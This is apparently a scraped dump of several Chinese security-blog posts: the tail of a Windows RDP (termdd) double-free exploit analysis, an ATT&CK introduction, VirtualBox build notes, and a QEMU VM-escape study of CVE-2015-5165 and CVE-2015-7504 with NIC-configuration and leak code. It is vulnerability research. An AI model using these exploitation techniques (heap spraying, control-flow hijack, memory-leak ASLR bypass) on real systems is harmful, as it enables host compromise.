[Non-Fpo]) 漏洞利用简介由于是double free，其实就是uaf利用思路，我们在第二次free的时候向上回溯 1234ChildEBP RetAddr Args to Child 8e653948 90238060 88ca9d48 88ca9d54 890a0670 termdd!_IcaFreeChannel (FPO: [Non-Fpo])8e653964 9023895f 88ca9d48 890a0670 00000000 termdd!IcaDereferenceChannel+0x34 (FPO: [Non-Fpo])8e6539a0 90239354 890a0670 00000005 0000001f termdd!IcaChannelInputInternal+0x3a7 (FPO: [Non-Fpo]) 发现IcaChannelInputInternal有虚函数调用，可以从这劫持控制流 看汇编也就是这里劫持控制流 要控制channel的数据，必须得在其第一次free了之后占位，我们申请同样大小的内存 我们看看申请的大小是0xc8 那么只要控制channel内存的0x8C偏移，劫持v12虚函数指针 但是我们要劫持到哪呢，没有信息泄露啊 现在exp的一般的做法是内核堆喷射，在Non-paged Pool进行堆喷，win7在这个地址上面是没有DEP的，所以直接喷内核shellcode就好了，而且win7的Non-paged Pool的起始地址比较固定，那还好命中一些 一切就绪就可以劫持控制流了 我们也可以看到堆喷射出的shellcode有很多 12345678910111213141516171819202122kd&gt; s 86000000 L 2000000 60 e8 00 00 00 00 5b e88688d030 60 e8 00 00 00 00 5b e8-23 00 00 00 b9 76 01 00 `.....[.#....v..8688d088 60 e8 00 00 00 00 5b e8-cb ff ff ff 8b 45 00 83 `.....[......E..8688d430 60 e8 00 00 00 00 5b e8-23 00 00 00 b9 76 01 00 `.....[.#....v..8688d488 60 e8 00 00 00 00 5b e8-cb ff ff ff 8b 45 00 83 `.....[......E..8688d830 60 e8 00 00 00 00 5b e8-23 00 00 00 b9 76 01 00 `.....[.#....v..8688d888 60 e8 00 00 00 00 5b e8-cb ff ff ff 8b 45 00 83 `.....[......E..8688dc30 60 e8 00 00 00 00 5b e8-23 00 00 00 b9 76 01 00 `.....[.#....v..8688dc88 60 e8 00 00 00 00 5b e8-cb ff ff ff 8b 45 00 83 `.....[......E..86892030 60 e8 00 00 00 00 5b e8-23 00 00 00 b9 76 01 00 `.....[.#....v..86892088 60 e8 00 00 00 00 5b e8-cb ff ff ff 8b 45 00 83 `.....[......E..86892430 60 e8 00 00 00 00 5b e8-23 00 00 00 b9 76 01 00 `.....[.#....v..86892488 60 e8 00 00 00 00 5b e8-cb ff ff ff 8b 45 00 83 `.....[......E..86892830 60 e8 00 00 00 00 5b e8-23 00 00 00 b9 76 01 00 `.....[.#....v..86892888 60 e8 00 00 00 00 5b e8-cb ff ff ff 8b 45 00 83 `.....[......E..86892c30 60 e8 00 00 00 00 5b e8-23 00 00 00 b9 76 01 00 `.....[.#....v..86892c88 60 e8 00 00 00 00 5b e8-cb ff ff ff 8b 45 00 83 `.....[......E..868c4030 60 e8 00 00 00 00 5b e8-23 00 00 00 b9 76 01 00 `.....[.#....v..868c4088 60 e8 00 00 00 00 5b e8-cb ff ff ff 8b 45 00 83 `.....[......E..868c4430 60 e8 00 00 00 00 5b e8-23 00 00 00 b9 76 01 00 `.....[.#....v..868c4488 60 e8 00 00 00 00 5b e8-cb ff ff ff 8b 45 00 83 `.....[......E..868c4830 60 e8 00 00 00 00 5b e8-23 00 00 00 b9 76 01 00 `.....[.#....v..","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"}]},{"title":"MITRE ATT&CK 入门","slug":"MITRE ATT&CK 入门","date":"2019-09-04T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2019/09/04/MITRE ATT&CK 入门/","link":"","permalink":"https://www.giantbranch.cn/2019/09/04/MITRE ATT&CK 入门/","excerpt":"","text":"最近ATT&amp;CK这个东西太火了，直观的就是由attack变换而来，那么可能是跟攻击相关的了，但实际是不是呢？ 入门的话就翻译一下官方的入门文档吧。 ATT&amp;CK为什么建立ATT&amp;CK代表对抗的战术，技术和常识（Common Knowledge）。 MITER于2013年启动了该项目，以记录针对Windows企业网络使用高级持久性威胁的常见策略，技术和过程（ tactics, techniques, and procedures —— TTPs）。 ATT&amp;CK的创建是为了记录在攻击者的行为（这是在MITER研究项目FMX中的）。 FMX项目的目标是挖掘并分析终端的监测数据以改善在企业网络内对攻击者的检测。 这里有详细的文档：使用基于ATT&amp;CK的分析和Cyber Analytics存储库查找威胁。 根据我们的研究，我们需要一个框架来解决四个主要的问题： 1、攻击者的行为。 基于攻击者的战术和技术使我们能够分析检测可疑的攻击者行为。域名，IP地址，文件哈希，注册表键等典型指标很容易被攻击者更改（换个域名，ip简单得不行），只对特定的时间点检测很有用 —— 它们并不代表攻击者如何与系统交互，只表示他们可能在某个时间在跟系统交互。 2、生命周期模型不合适。现有的攻击生命周期和攻击链的概念太过抽象，无法将行为与防御联系起来——抽象的层次对于将TTPs映射到新的攻击感知没有什么帮助。 3、适用于真实环境。 TTPs需要基于观察到的事件来证明这东西适用于真实环境。 4、共同分类。 TTPs需要使用相同的术语以便在不同类型的攻击者之间进行比较。 我们坚信进攻是防守的最佳驱动力。 通过维持强大的攻击和防御团队的协同工作，那么检测和阻止入侵的能力会大大提高。 在FMX项目中，ATT&amp;CK是用于构建模拟攻击场景的框架。 模拟攻击团队使用这些场景将真实世界的攻击注入网络。 然后，团队使用测试用例来验证监测设备和分析是否检测到生产网络中的攻击行为。 该方法可使检测能力快速提高。最重要的是，以可测量和可重复的方式不断进行。 ATT&amp;CK成为了模拟攻击团队计划事件和检测团队验证其进度的首选工具。 对于MITRE的研究计划来说，这是一个非常有用的过程，我们觉得它应该被发布以使整个社区受益，因此MITER于2015年5月向公众发布了ATT&amp;CK。ATT&amp;CK已经大大扩展到采用针对macOS和Linux的技术，攻击者对移动设备的攻击行为，以及用于计划和实施漏洞利用的攻击战略。 什么是 ATT&amp;CK?ATT&amp;CK在很大程度上是对抗技术的知识库 - 可以用于特定平台（如Windows）的攻击性操作的细分和分类。 与此领域的先前工作不同，重点不在于对手使用的工具和恶意软件，而在于它们在操作期间如何与系统交互。 ATT&amp;CK将这些技术组织成一套策略，以帮助解释并提供该技术的上下文。 每种技术都包含与红色团队或渗透测试人员相关的信息，用于理解攻击技术，以及防御者用于理解由这些攻击技术所生成的事件或人为制造的东西（原文是artifacts，直译是人工品）。 战术代表了ATT&amp;CK技术的“why”。 战术是攻击者执行行动的战术目标。 战术是个人技术的范畴，涵盖了攻击者在操作期间所做事情的标准及更高级别的表示，例如持久化，信息发现，横向移动，执行文件和泄露数据。 技术代表攻击者通过攻击行动实现战术目标的“方式”。 例如，攻击者可以转储凭证以获得对网络访问的有用凭证，该凭证可以在以后用于横向移动。 技术也可以表示攻击者通过行动而获得的“什么”。 这对于发现战术来说，这是一个有用区别，因为技术突出了攻击者在采取特定行动后所追求的信息类型。 实现战术目标的方法或技术可能有很多，因此每种战术类别都有多种技术。 ATT&amp;CK Matrix™战术和技术之间的关系可以在ATT&amp;CK矩阵中可视化。 例如，在持久化（Persistence）战术（这是攻击者的目标 - 持久存在于目标环境中）下面有一系列技术，包括AppInit DLL（在注册表有个AppInit_DLLs值，可以指定动态链接库（DLL）由user32.dll加载），New Service（创建新的服务）和Scheduled Task（计划任务）。 这些都是攻击者可用于实现持久性目标的单一技术。 注：Persistence战术具体可以看这：https://attack.mitre.org/tactics/TA0003/ ATT&amp;CK 矩阵可能是ATT&amp;CK中最广为人知的，因为它通常用于展示环境的防御覆盖情况，安全产品的检测能力以及事件的结果或是红队参与的结果。 网络威胁情报（Cyber Threat Intelligence）ATT&amp;CK的另一个重要方面是它如何整合网络威胁情报（CTI）。 与先前主要用指标去消化CTI的方式不同，ATT&amp;CK记录了攻击者的行为概况，例如APT29，基于公开报告来显示哪些群体使用哪种技术。 通常，单个报告用于记录一个特定事件或特定攻击组织，但这使得难以比较事件或攻击组织之间发生的事情，并得出哪些类型的防御最有效的结论。 通过ATT&amp;CK，分析师可以通过专注于技术本身来查看攻击活动。 在决定如何集中防御资源时，分析师可能希望从具有最高使用率的技术开始。 攻击者如何使用技术的示例已经记录在ATT&amp;CK页面中，该页面表示该组使用该技术的过程。 该过程是一个特定的使用实例，对于准确理解该技术的使用方式以及使用模拟攻击复盘事件以及如何检测正在使用的实例的细节非常有用。 ATT&amp;CK 今天用在了哪里ATT&amp;CK在过去五年发展的非常好，包括从Windows到其他平台，还有各种技术。 它被许多不同的政府组织和行业部门使用，包括金融，医疗保健，零售和科技行业。 公众的采用和使用已经为ATT&amp;CK带来了重要贡献，使其保持最新并对社区有用。 我们希望继续这一趋势，因此MITER有很大的计划继续发展ATT&amp;CK，以确保其未来作为一个有价值的公共资源。 Continuing This Series现在我们已经介绍了一些基础知识，您可以期待将来的博客文章更详细地介绍这篇文章中涉及的主题。 我们将讨论ATT&amp;CK与网络威胁情报，基于行为的检测分析和攻击者模拟攻击以及其他领域的使用。 博客的话是这个：https://medium.com/mitre-attack官网是这个：https://attack.mitre.org/ 最后摘录国内一个文章的片段：https://www.anquanke.com/post/id/185492 TTP的定义：（来源：美国国家标准技术研究所） TTP即对手的行为。战术是对此行为的最高级别描述，而技术在战术的上下文中提供更详细的行为描述，而过程是在技术的上下文中更低级别，更详细的描述。 – 战术：对手的技术目标（如，横向移动） – 技术：如何实现目标（如，PsExec） – 过程：具体技术实施（如，使用PsExec实现横向移动的过程） 参考https://medium.com/mitre-attack/att-ck-101-17074d3bc62","categories":[],"tags":[{"name":"ATT&CK","slug":"ATT-CK","permalink":"https://www.giantbranch.cn/tags/ATT-CK/"}]},{"title":"在ubuntu 18.04上编译VirtualBox","slug":"在ubuntu 18.04上编译VirtualBox","date":"2019-08-07T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2019/08/07/在ubuntu 18.04上编译VirtualBox/","link":"","permalink":"https://www.giantbranch.cn/2019/08/07/在ubuntu 18.04上编译VirtualBox/","excerpt":"","text":"源码下载地址： https://download.virtualbox.org/virtualbox/ 当然这个也可以 https://www.virtualbox.org/wiki/Download_Old_Builds 我下载了这个5.2.18 https://download.virtualbox.org/virtualbox/5.2.18/VirtualBox-5.2.18.tar.bz2 linux下的编译文档 https://www.virtualbox.org/wiki/Linux%20build%20instructions libhal-dev和python-central没找到，就先不安装了 1234567891011sudo apt-get install gcc g++ bcc iasl xsltproc uuid-dev zlib1g-dev libidl-dev \\ libsdl1.2-dev libxcursor-dev libasound2-dev libstdc++5 \\ libpulse-dev libxml2-dev libxslt1-dev \\ python-dev libqt4-dev qt4-dev-tools libcap-dev \\ libxmu-dev mesa-common-dev libglu1-mesa-dev \\ linux-kernel-headers libcurl4-openssl-dev libpam0g-dev \\ libxrandr-dev libxinerama-dev libqt4-opengl-dev makeself \\ libdevmapper-dev default-jdk \\ texlive-latex-base \\ texlive-latex-extra texlive-latex-recommended \\ texlive-fonts-extra texlive-fonts-recommended 64位系统还要装一下 12sudo apt-get install lib32z1 libc6-dev-i386 lib32gcc1 gcc-multilib \\ lib32stdc++6 g++-multilib 链接共享库 123456sudo ln -s libX11.so.6 /usr/lib32/libX11.so sudo ln -s libXTrap.so.6 /usr/lib32/libXTrap.so sudo ln -s libXt.so.6 /usr/lib32/libXt.so sudo ln -s libXtst.so.6 /usr/lib32/libXtst.sosudo ln -s libXmu.so.6 /usr/lib32/libXmu.sosudo ln -s libXext.so.6 /usr/lib32/libXext.so ./configure来发现还有东西没装 1sudo apt-get install libssl-dev libvpx-dev libopus-dev 之后就是qt5 not found，上面的qt4费了 12Checking for Qt5: ** qt5 not found! 安装qt5 1sudo apt-get install build-essential qtcreator qt5-default libqt5* 编译的时候有错误 我就发现kmk可以-i忽略错误 1kmk BUILD_TYPE=debug -i 之后就ko了 直接启动即可","categories":[],"tags":[{"name":"编译","slug":"编译","permalink":"https://www.giantbranch.cn/tags/编译/"},{"name":"virtualbox","slug":"virtualbox","permalink":"https://www.giantbranch.cn/tags/virtualbox/"}]},{"title":"VM escape 之 QEMU Case Study","slug":"VM escape 之 QEMU Case Study","date":"2019-07-17T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2019/07/17/VM escape 之 QEMU Case Study/","link":"","permalink":"https://www.giantbranch.cn/2019/07/17/VM escape 之 QEMU Case Study/","excerpt":"","text":"声明：首先这篇文章算是翻译+实践的 学习的来源是phrack网站的paper，这个应是上年就看到了，现在才去尝试实践与学习。 其实算是简译再加上自己的实践吧，最后劫持rip起shell由于需要特殊的内核编译才能搞，就没具体实践了，原理上理解了。 看完这篇文章，一句话说明虚拟机逃逸漏洞利用其实就是： 利用qemu代码实现上的漏洞去起一个/bin/sh什么的（当然执行计算器也是可以的），问题是我们在guest虚拟机里面，我们怎么控制那个/bin/sh呢，那就是通过共享内存交换数据（传递我们的命令到共享内存，最终传递给shell，之后将shell命令的执行结果放入共享内存传递回来guest虚拟机），从而实现在guest虚拟机控制qemu启动的/bin/sh。 简介无论企业还是个人，都越来越频繁地使用虚拟化技术，从而引出虚拟机逃逸 这个案例讲的是CVE-2015-5165 (信息泄露漏洞) and CVE-2015-7504 (堆溢出漏洞) KVM/QEMU 总览KVM（Kernel Virtual Machine）是Linux的一个内核驱动模块，它能够让Linux主机成为一个Hypervisor（虚拟机监控器）。 QEMU（quick emulator)本身并不包含或依赖KVM模块，而是一套由Fabrice Bellard编写的模拟计算机的自由软件。QEMU虚拟机是一个纯软件的实现，可以在没有KVM模块的情况下独立运行，但是性能比较低。QEMU使用了KVM模块的虚拟化功能，为自己的虚拟机提供硬件虚拟化加速以提高虚拟机的性能。 环境搭建git clone下来后需要回退到漏洞版本 下面编译成x86_64，并且启用调试 12345678$ git clone git://git.qemu-project.org/qemu.git$ cd qemu$ git checkout bd80b59$ mkdir -p bin/debug/native$ cd bin/debug/native$ ../../../configure --target-list=x86_64-softmmu --enable-debug \\$ --disable-werror$ make 当然可能在编译器前需要下载pixman，autoconf 12apt install libpixman-1-devapt install autoconf 之后得装下系统获得一个qcow2的镜像，直接用别人的镜像也行，我下面安装的是ubuntu-16.04.5-server 我们可以新建硬盘，在启动安装，可能需要vnc连接安装一下 12qemu-img create -f qcow2 ubuntu.qcow2 20Gqemu-system-x86_64 -enable-kvm -m 2048 -hda /path/to/ubuntu.qcow2 -cdrom /path/to/ubuntu.iso 当然我们也可以通过图形化的virt-manager来安装 123sudo apt install virt-managersudo apt install qemusudo apt install qemu-kvm 镜像可能size是我们设置的硬盘大小20G，可以这样缩小为实际占用空间 1sudo qemu-img convert -c -O qcow2 ubuntu16.04.qcow2 ubuntu16.04.qcow2.new 有了qcow2镜像后，就可以启动了，添加了漏洞相关的两个网卡rtl8139和pcnet，path_to_image自己修改下 1234./qemu-system-x86_64 -enable-kvm -m 2048 -display vnc=:89 \\ -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \\ -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 \\ -drive file=&lt;path_to_image&gt;,format=qcow2,if=ide,cache=writeback 当然可以通过添加这个参数-redir tcp:5022::22映射ssh端口，我们连接5022即可连接qemu里面的ssh 注意vnc的端口是5989（默认端口是5900，5900+89 = 5989，89是上面的参数） 别人直接attach去调试是可以的，但是我们attach上去之后就不能再c了，不知道为何，也没下断点，怎么就有一个-1的断点呢，知道如何解决的告诉我。 所以我只能直接gdb启动qemu了， 调试示例： 1gdb --args ./qemu-system-x86_64 -enable-kvm -m 2048 -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 -redir tcp:5022::22 -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 -drive file=/ubuntu16.04.qcow2,format=qcow2,if=ide,cache=writeback QEMU内存布局guest虚拟机的物理内存实际上是qemu程序mmap出来的一块private属性的虚拟内存。而且PROT_EXEC这个标志在这个虚拟内存中是不启用的 下面作者的图比较直观 我们去查maps文件的时候，也可以看出来，上面qemu启动命令所设置的2G内存 12345678910111213141516$ sudo cat /proc/5291/maps55dad0b86000-55dad1124000 r-xp 00000000 08:01 665015 /XXXXX/XXXXX/qemu-system-x86_6455dad1323000-55dad13ed000 r--p 0059d000 08:01 665015 /XXXXX/XXXXX/qemu-system-x86_6455dad13ed000-55dad146a000 rw-p 00667000 08:01 665015 /XXXXX/XXXXX/qemu-system-x86_6455dad146a000-55dad18d9000 rw-p 00000000 00:00 0 55dad1f65000-55dad3b83000 rw-p 00000000 00:00 0 [heap]7f1a1c000000-7f1a1c022000 rw-p 00000000 00:00 0 7f1a1c022000-7f1a20000000 ---p 00000000 00:00 0 7f1a20000000-7f1aa0000000 rw-p 00000000 00:00 0 //这个就是2G内存7f1aa0000000-7f1aa07a0000 rw-p 00000000 00:00 0 7f1aa07a0000-7f1aa4000000 ---p 00000000 00:00 0 7f1aa4acb000-7f1aa8000000 rw-p 00000000 00:00 0 7f1aa8000000-7f1aa809e000 rw-p 00000000 00:00 0 .................. 上面那个为啥是2G，你看看下面的2G的大小，以及下面的地址差 1234&gt;&gt;&gt; hex(2*1024*1024*1024)&apos;0x80000000&apos;&gt;&gt;&gt; hex(0x7f1aa0000000 - 0x7f1a20000000)&apos;0x80000000&apos; 地址转换这里面有两层转换 1、从guest 的虚拟机地址 to guest 的物理地址 2、从 guest 的物理地址 to QEMU’s 虚拟地址空间 假如知道了上一小节，这个就不难理解了 在64位系统，虚拟地址是由页面偏移（0到11 bits）和页号组成的。 而且pagemap页面映射文件给了用户空间的进程CAP_SYS_ADMIN权限去找到虚拟地址与物理地址的映射 pagemap页面映射文件包含的虚拟页面是一个64位的值，如下面所示 1234567- Bits 0-54 : physical frame number if present.- Bit 55 : page table entry is soft-dirty.- Bit 56 : page exclusively mapped.- Bits 57-60 : zero- Bit 61 : page is file-page or shared-anon.- Bit 62 : page is swapped.- Bit 63 : page is present. 为了将虚拟地址转换成物理地址，使用Nelson Elhage的代码，下面的程序申请了一个buffer，并写入字符串——“Where am I?”，之后打印他的物理地址 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;assert.h&gt;#include &lt;inttypes.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) - 1)int fd;// 获取页内偏移uint32_t page_offset(uint32_t addr)&#123; // addr &amp; 0xfff return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);&#125;uint64_t gva_to_gfn(void *addr)&#123; uint64_t pme, gfn; size_t offset; printf(&quot;pfn_item_offset : %p\\n&quot;, (uintptr_t)addr &gt;&gt; 9); offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7; ////下面是网上其他人的代码，只是为了理解上面的代码 //一开始除以 0x1000 （getpagesize=0x1000，4k对齐，而且本来低12位就是页内索引，需要去掉），即除以2**12, 这就获取了页号了， //pagemap中一个地址64位，即8字节，也即sizeof(uint64_t)，所以有了页号后，我们需要乘以8去找到对应的偏移从而获得对应的物理地址 //最终 vir/2^12 * 8 = (vir / 2^9) &amp; ~7 //这跟上面的右移9正好对应，但是为什么要 &amp; ~7 ,因为你 vir &gt;&gt; 12 &lt;&lt; 3 , 跟vir &gt;&gt; 9 是有区别的，vir &gt;&gt; 12 &lt;&lt; 3低3位肯定是0，所以通过&amp; ~7将低3位置0 // int page_size=getpagesize(); // unsigned long vir_page_idx = vir/page_size; // unsigned long pfn_item_offset = vir_page_idx*sizeof(uint64_t); lseek(fd, offset, SEEK_SET); read(fd, &amp;pme, 8); // 确保页面存在——page is present. if (!(pme &amp; PFN_PRESENT)) return -1; // physical frame number gfn = pme &amp; PFN_PFN; return gfn;&#125;uint64_t gva_to_gpa(void *addr)&#123; uint64_t gfn = gva_to_gfn(addr); assert(gfn != -1); return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);&#125;int main()&#123; uint8_t *ptr; uint64_t ptr_mem; fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY); if (fd &lt; 0) &#123; perror(&quot;open&quot;); exit(1); &#125; ptr = malloc(256); strcpy(ptr, &quot;Where am I?&quot;); printf(&quot;%s\\n&quot;, ptr); ptr_mem = gva_to_gpa(ptr); printf(&quot;Your physical address is at 0x%&quot;PRIx64&quot;\\n&quot;, ptr_mem); getchar(); return 0;&#125; 我们将上面这个代码编译后，放到qemu运行（root权限） 之后我们在主机gdb attach到qemu的pid（root权限） 查看分配给qemu虚拟机对应的内存，我们分配的是2G，所以大小是0x8000000 123456789101112131415161718192021gdb-peda$ info proc mappingsprocess 2776Mapped address spaces: Start Addr End Addr Size Offset objfile 0x56154915f000 0x5615497a2000 0x643000 0x0 /XXXXXXXXXX/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64 0x5615499a1000 0x561549a71000 0xd0000 0x642000 /XXXXXXXXXX/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64 0x561549a71000 0x561549af7000 0x86000 0x712000 /XXXXXXXXXX/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64 0x561549af7000 0x561549f87000 0x490000 0x0 0x56154b0fc000 0x56154cd14000 0x1c18000 0x0 [heap] 0x7fcdd4000000 0x7fcdd40b8000 0xb8000 0x0 0x7fcdd40b8000 0x7fcdd8000000 0x3f48000 0x0 0x7fcdd86c9000 0x7fcddbe00000 0x3737000 0x0 0x7fcddbe00000 0x7fcddbe01000 0x1000 0x0 0x7fcddbeff000 0x7fcddc000000 0x101000 0x0 0x7fcddc000000 0x7fce5c000000 0x80000000 0x0 &lt;=========就这个 0x7fce5c000000 0x7fce5c883000 0x883000 0x0 0x7fce5c883000 0x7fce60000000 0x377d000 0x0 。。。。。。 。。。。。。 。。。。。。 可以看到确实可以在这个虚拟地址看到我们字符串 信息泄露利用的实现下面是CVE-2015-5165，一个 RTL8139 网卡设备模拟器的内存信息泄露漏洞 我们需要获得下面两种地址1、.text段的基址来构建我们的shellcode2、guest虚拟机的物理地址，以便得到一些虚拟结构的地址 漏洞代码REALTEK 网卡支持两种模式：C 和 C+，问题在C+模式的时候，网卡设备模拟器错误地计算了IP数据包数据的长度并最终发送了比实际数据包中的更多数据。 漏洞在hw/net/rtl8139.c文件的rtl8139_cplus_transmit_one的函数中 12345678910111213141516171819202122232425262728293031/* ip packet header */ip_header *ip = NULL;int hlen = 0;uint8_t ip_protocol = 0;uint16_t ip_data_len = 0;uint8_t *eth_payload_data = NULL;size_t eth_payload_len = 0;int proto = be16_to_cpu(*(uint16_t *)(saved_buffer + 12));if (proto == ETH_P_IP)&#123; DPRINTF(&quot;+++ C+ mode has IP packet\\n&quot;); /* not aligned */ eth_payload_data = saved_buffer + ETH_HLEN; eth_payload_len = saved_size - ETH_HLEN; ip = (ip_header*)eth_payload_data; if (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123; DPRINTF(&quot;+++ C+ mode packet has bad IP version %d &quot; &quot;expected %d\\n&quot;, IP_HEADER_VERSION(ip), IP_HEADER_VERSION_4); ip = NULL; &#125; else &#123; hlen = IP_HEADER_LENGTH(ip); ip_protocol = ip-&gt;ip_p; ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen; //计算ip_data_len的时候没有判断ip-&gt;ip_len &lt; hlen &#125;&#125; IP头包含了上面的两个字段， hlen和ip-&gt;ip_len hlen是IP头的长度，这个是固定的20字节，不包括可选字段 ip-&gt;ip_len是整个包的总长度，包含ip头部的 而且ip_data_len的类型是uint16_t，即unsigned short int，所以当ip-&gt;ip_len小于hlen，计算出的结果是负数，转化为unsigned short int，那就是一个大整数了，最终导致发送的数据超过实际ip data区的数据，从而实现泄露 1typedef unsigned short int uint16_t; 而超过了MTU的长度，会一个chunk一个chunk地传输 下面是部分代码分成一个一个chunk的代码 123456789101112131415161718192021222324252627//通过ip_data_len算出tcp_data_lenint tcp_data_len = ip_data_len - tcp_hlen;//int tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;int is_last_frame = 0;for (tcp_send_offset = 0; tcp_send_offset &lt; tcp_data_len; tcp_send_offset += tcp_chunk_size) &#123; uint16_t chunk_size = tcp_chunk_size; /* check if this is the last frame */ if (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len) &#123; is_last_frame = 1; chunk_size = tcp_data_len - tcp_send_offset; &#125; memcpy(data_to_checksum, saved_ip_header + 12, 8); if (tcp_send_offset) &#123; memcpy((uint8_t*)p_tcp_hdr + tcp_hlen, (uint8_t*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size); &#125; /* more code follows */&#125; 所以我们发送一个恶意的数据包包含特殊的长度（比如ip-&gt;ip_len = hlen - 1），ip_data_len是unsigned short int，所以可以泄露0xffff个字节，那就是我们可以泄露约64KB的内存，收到约43个数据包，因为mtu一般1500。 配置网卡为了发送格式错误的数据包并读取泄漏的数据，我们需要配置第一个Rx和Tx描述符缓冲区，并设置一些标志位，以便进入易受攻击的代码路径。 下面是RTL8139漏洞相关的寄存器 TxConfig: Enable/disable Tx flags 比如 TxLoopBack (开启 loopback测试模式test mode), TxCRC (不添加CRC校验码的 Tx 包), etc. RxConfig: Enable/disable Rx flags 比如 AcceptBroadcast (接收广播包), AcceptMulticast (接收组播包), etc. CpCmd: C+ 命令寄存器用来开启一些函数如下：CplusRxEnd (enable receive), CplusTxEnd (enable transmit), etc. TxAddr0: Tx descriptors table的物理地址. RxRingAddrLO: Rx descriptors 低32位的物理地址table. RxRingAddrHI: Rx descriptors 高32位的地址table. TxPoll: 让网卡检查Tx descriptors. 一个Rx/Tx-descriptor就是下面的结构：buf_lo和buf_hi就是 Tx/Rx 的物理地址的低32和高32位，它们指向发送/接收数据包的缓冲区，必须与页面大小对齐。变量dw0编码了缓冲区的大小还有额外的标记位，比如用来标记缓冲区归网卡还是驱动所有。 123456struct rtl8139_desc &#123; uint32_t dw0; uint32_t dw1; uint32_t buf_lo; uint32_t buf_hi;&#125;; 网卡通过in() 和out()进行配置 (from sys/io.h)，我们需要有CAP_SYS_RAWIO权限 下面的代码片段配置网卡，并设置单个Tx描述符 struct rtl8139_desc { uint32_t dw0; uint32_t dw1; uint32_t buf_lo; uint32_t buf_hi;}; 网卡的设置通过 in() out() 原语来配置 (fromsys/io.h). 而且我们需要 CAP_SYS_RAWIO 权限才能配置. 下面的代码片段配置了网卡还有初始化了一个Tx descriptor。 12345678910111213141516171819202122232425262728293031#define RTL8139_PORT 0xc000#define RTL8139_BUFFER_SIZE 1500struct rtl8139_desc desc;void *rtl8139_tx_buffer;uint32_t phy_mem;// 申请对齐的内存，并将返回值转化为物理地址rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);phy_mem = (uint32)gva_to_gpa(rtl8139_tx_buffer);memset(&amp;desc, 0, sizeof(struct rtl8139_desc));// 设置Tx descriptor 的dw0，包括缓冲区大小和一些标志位desc-&gt;dw0 |= CP_TX_OWN | CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN | CP_TX_IPCS | CP_TX_TCPCS;desc-&gt;dw0 += RTL8139_BUFFER_SIZE;//设置低32位desc.buf_lo = phy_mem;iopl(3);outl(TxLoopBack, RTL8139_PORT + TxConfig);outl(AcceptMyPhys, RTL8139_PORT + RxConfig);outw(CPlusRxEnb|CPlusTxEnb, RTL8139_PORT + CpCmd);outb(CmdRxEnb|CmdTxEnb, RTL8139_PORT + ChipCmd);outl(phy_mem, RTL8139_PORT + TxAddr0);outl(0x0, RTL8139_PORT + TxAddr0 + 0x4); 漏洞利用漏洞利用代码设置了网卡的寄存器还有Tx 和 Rx buffer descriptors，之后发一个异常格式的数据包到网卡的MAC地址，这样我们就可以通过访问Rx缓冲区来读取泄露的数据了 泄露的数据中有几个函数指针，而他们是同一个QEMU内部结构的成员 12345678910111213typedef struct ObjectProperty&#123; gchar *name; gchar *type; gchar *description; ObjectPropertyAccessor *get; ObjectPropertyAccessor *set; ObjectPropertyResolve *resolve; ObjectPropertyRelease *release; void *opaque; QTAILQ_ENTRY(ObjectProperty) node;&#125; ObjectProperty; 应该说是这几个 1234ObjectPropertyAccessor *get;ObjectPropertyAccessor *set;ObjectPropertyResolve *resolve;ObjectPropertyRelease *release; qemu遵循对象模型来管理设备，内存区域等，qemu启动的时候，会创建多个对象并为其分配属性。 比如下面的函数会给一个内存区域对象真机一个may-overlap的属性，这个属性有一个getter方法去获取这个属性的布尔值 1234object_property_add_bool(OBJECT(mr), \"may-overlap\", memory_region_get_may_overlap, NULL, /* memory_region_set_may_overlap */ &amp;error_abort); RTL8139网卡设备仿真器 在堆上用一个64KB的内存来重新组装数据包。而这个64K的buffer有很大机会把free掉了的object properties的内存占位了 在漏洞利用中，我们在泄漏的内存中搜索已知的对象属性。更确切地说，我们正在寻找80字节的内存块（块的大小为已经free掉的ObjectProperty结构，80加上堆头16，就是96，即0x60），其中至少有一个函数指针（get, set, resolve or release），即使开了ASLR，我们仍然可以获得.text部分的基地址。实际上，他们的页面偏移是固定的（12个最低有效位不是随机的），我们可以通过一些简单的计算获得qemu一些有用的函数的地址，我们也可以得到libc的一些地址，比如mprotect() 和 system() 的地址 我们还注意到地址PHY_MEM + 0x78泄漏了几次，其中PHY_MEM是给guest虚拟机分配的物理内存的起始地址 exp就是搜索泄露的内存数据并尝试解析，.text段的虚拟地址，以及物理内存的基址 这个可能需要一行一行的读代码才能好理解 我们可以通过build-exploit.sh，生成的各种函数的相对偏移，之后替换掉qemu.h，再编译cve-2015-5165.c即可 实验结果： 堆溢出的利用这个小节是讨论CVE-2015-7504，同时提供控制rip的exp 漏洞代码AMD PCNET网卡模拟器在本地回环测试模式下收到大的数据包时存在堆溢出漏洞，PCNET模拟器保留了4Kb（4096 bytes）的buffer来存储数据包。如果Tx descriptor 